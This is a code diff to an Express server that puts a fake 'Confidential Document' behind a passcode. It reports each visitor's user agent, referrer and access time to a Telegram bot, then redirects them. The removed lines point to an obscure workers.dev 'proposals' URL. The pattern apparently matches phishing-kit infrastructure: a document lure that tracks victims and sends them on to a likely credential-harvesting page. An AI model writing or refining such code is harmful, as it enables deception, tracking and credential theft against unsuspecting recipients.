@@ -6,100 +6,74 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
+// Middleware to parse JSON bodies and serve static files
 app.use(express.json());
 app.use(express.static(__dirname));
 
-const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2089210";
+// Environment Variables Configuration
+const CORRECT_PASSCODE = process.env.PASSCODE;
+const REDIRECT_URL = process.env.REDIRECT_URL;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Add as many URLs as you want here. The script will pick one at random.
-const REDIRECT_URLS = [
-  "https://gc2089-proposals-2a7522.cdngroupsbidding.workers.dev/?k=InUnPNcqMEFoRP7B5v-A4dd_"
-];
-
-app.post('/api/unlock', async (req, res) => {
+app.post('/api/verify', async (req, res) => {
   try {
-    const { password, userAgent, referrer } = req.body;
+    const { passcode, userAgent, referrer } = req.body;
 
-    console.log('Received unlock request. Password provided:', !!password);
+    console.log('Received verification request.');
 
-    if (password === CORRECT_CODE) {
-      const token = process.env.TELEGRAM_BOT_TOKEN;
-      const chatId = process.env.TELEGRAM_CHAT_ID;
-
-      console.log('Bot token exists:', !!token);
-      console.log('Chat ID:', chatId);
-
-      if (!token || !chatId) {
-        console.error("Missing Telegram environment variables");
-        return res.status(500).json({ 
-          success: false, 
-          error: "Server configuration error" 
+    // 1. Check if the passcode matches
+    if (passcode === CORRECT_PASSCODE) {
+      
+      // 2. Optional: Send Telegram notification (only if tokens are configured)
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const now = new Date().toLocaleString('en-US', { 
+          timeZone: 'America/New_York',
+          year: 'numeric', month: 'short', day: 'numeric',
+          hour: '2-digit', minute: '2-digit', second: '2-digit'
         });
-      }
 
-      const now = new Date().toLocaleString('en-US', { 
-        timeZone: 'America/New_York',
-        year: 'numeric', 
-        month: 'short', 
-        day: 'numeric',
-        hour: '2-digit', 
-        minute: '2-digit', 
-        second: '2-digit'
-      });
+        const message = 
+          `🔓 *DOCUMENT ACCESSED*\n` +
+          `📄 File: Confidential Document.pdf\n` +
+          `🕒 Time: ${now}\n` +
+          `🌐 User Agent: ${userAgent || 'unknown'}\n` +
+          `🔗 Referrer: ${referrer || 'direct'}\n` +
+          `✅ Passcode verified successfully.`;
 
-      // Clean message - no special characters that could break Telegram
-      const message = 
-        `SUCCESSFUL UNLOCK\n` +
-        `Document: Project-TH2027.pdf\n` +
-        `Time: ${now}\n` +
-        `User Agent: ${userAgent || 'unknown'}\n` +
-        `Referrer: ${referrer || 'direct'}\n` +
-        `Password Used: ${password}\n` +
-        `Client accessed the document.`;
-
-      try {
-        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-          chat_id: chatId,
-          text: message
-        });
-        
-        console.log('✅ Telegram notification sent successfully');
-        console.log('Telegram response:', response.data);
-        
-      } catch (telegramError) {
-        // Log the EXACT error from Telegram
-        if (telegramError.response) {
-          console.error('❌ Telegram Error Status:', telegramError.response.status);
-          console.error('❌ Telegram Error Data:', JSON.stringify(telegramError.response.data));
-        } else {
-          console.error('❌ Telegram Error:', telegramError.message);
+        try {
+          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+          });
+          console.log('✅ Telegram notification sent.');
+        } catch (tgError) {
+          console.error('❌ Telegram Error:', tgError.response ? tgError.response.data : tgError.message);
         }
       }
 
-      // Pick a random URL from the array
-      const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
-
-      // Always allow access even if Telegram fails
-      res.json({ 
+      // 3. Return success and the redirect URL to the frontend
+      return res.json({ 
         success: true, 
-        redirectUrl: randomUrl 
+        redirectUrl: REDIRECT_URL 
       });
+
     } else {
-      console.log('❌ Incorrect password attempt');
-      res.status(401).json({ 
+      // Incorrect passcode
+      return res.status(401).json({ 
         success: false, 
-        error: "That password is incorrect. Try again." 
+        error: "Incorrect code. Please try again." 
       });
     }
   } catch (error) {
     console.error('Server error:', error);
-    res.status(500).json({ 
+    return res.status(500).json({ 
       success: false, 
-      error: "Failed to process request" 
+      error: "An unexpected error occurred. Please try again." 
     });
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server running securely on port ${PORT}`);
 });
